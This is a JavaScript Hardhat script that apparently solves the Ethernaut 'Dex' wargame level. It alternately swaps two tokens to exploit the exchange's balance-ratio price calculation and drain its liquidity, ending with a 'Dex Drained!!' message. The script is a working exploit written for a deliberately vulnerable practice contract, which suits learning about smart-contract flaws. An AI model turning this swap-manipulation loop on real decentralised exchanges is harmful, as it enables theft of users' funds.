// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [player] = await ethers.getSigners();

  // connect to ethernaut instance and token addresses
  const instanceAddress = "0x7a96dF20AE9B792e49F977F9a1F1461ebb0cbB25";
  const token1Address = "0x576B46931725A93A8DB74093bC03F5c4Ec51bE95";
  const token2Address = "0x63006bFD42249B8F3caf1709b4CD1968964D148B";
  const Dex = await ethers.getContractFactory("Dex");
  const TSwap = await ethers.getContractFactory("SwappableToken");
  const dex = await Dex.attach(instanceAddress);
  const token1 = await TSwap.attach(token1Address);
  const token2 = await TSwap.attach(token2Address);
  console.log('Connected to level instance, token1 instance, and token2 instance');

  // check token balances
  let playerBalance1 = await dex.balanceOf(token1.address, player.address);
  let playerBalance2 = await dex.balanceOf(token2.address, player.address);
  let dexBalance1 = await dex.balanceOf(token1.address, dex.address);
  let dexBalance2 = await dex.balanceOf(token2.address, dex.address);

  console.log('Starting off:')
  console.log(`Dex Token Balances:\n\tToken 1: ${dexBalance1}\n\tToken 2: ${dexBalance2}`);
  console.log(`Player Token Balances:\n\tToken 1: ${playerBalance1}\n\tToken 2: ${playerBalance2}\n`);

  // start swapping all of 1 for 2 and vice versa
  let counter = 1;
  while (dexBalance1 != 0 && dexBalance2 != 0) {
    if (counter%2 == 0) {
      console.log(`Swapping 1 for 2\n`);
      await performSwap(player, dex, token1, token2);
    }
    else {
      console.log(`Swapping 2 for 1\n`);
      await performSwap(player, dex, token2, token1);
    }
    
    playerBalance1 = await dex.balanceOf(token1.address, player.address);
    playerBalance2 = await dex.balanceOf(token2.address, player.address);
    dexBalance1 = await dex.balanceOf(token1.address, dex.address);
    dexBalance2 = await dex.balanceOf(token2.address, dex.address);
    console.log(`Dex Token Balances:\n\tToken 1: ${dexBalance1}\n\tToken 2: ${dexBalance2}`);
    console.log(`Player Token Balances:\n\tToken 1: ${playerBalance1}\n\tToken 2: ${playerBalance2}\n`);
    counter++;
    console.log(`\n\n`);
  }
  console.log('Dex Drained!!');
}

async function performSwap(player, dex, from, to) {
  // calc whether we should spend the whole allowance or drain the contract
  const maxAmt = await dex.balanceOf(from.address, player.address);
  const dexFromAmt = await dex.balanceOf(from.address, dex.address);
  const dexToAmt = await dex.balanceOf(to.address, dex.address);
  const maxSwapPrice = (maxAmt * dexToAmt) / dexFromAmt;
  let spendAmt;

  if (maxSwapPrice > dexToAmt) {
    spendAmt = dexFromAmt;
  }
  else {
    spendAmt = maxAmt;
  }
  const swapPrice = (spendAmt * dexToAmt) / dexFromAmt;
  console.log(`Swap Amt:\t${spendAmt}`);
  console.log(`Swap Price:\t${swapPrice}`);

  try {
    const tx1 = await dex.connect(player).approve(dex.address, spendAmt, { gasLimit: 500000 });
    await tx1.wait();
    console.log('Approval Success');
    const tx2 = await dex.connect(player).swap(from.address, to.address, spendAmt, { gasLimit: 10000000 });
    await tx2.wait();
    console.log('Swap Success');
  } catch (err) {
    console.log(err.message);
    throw(err);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
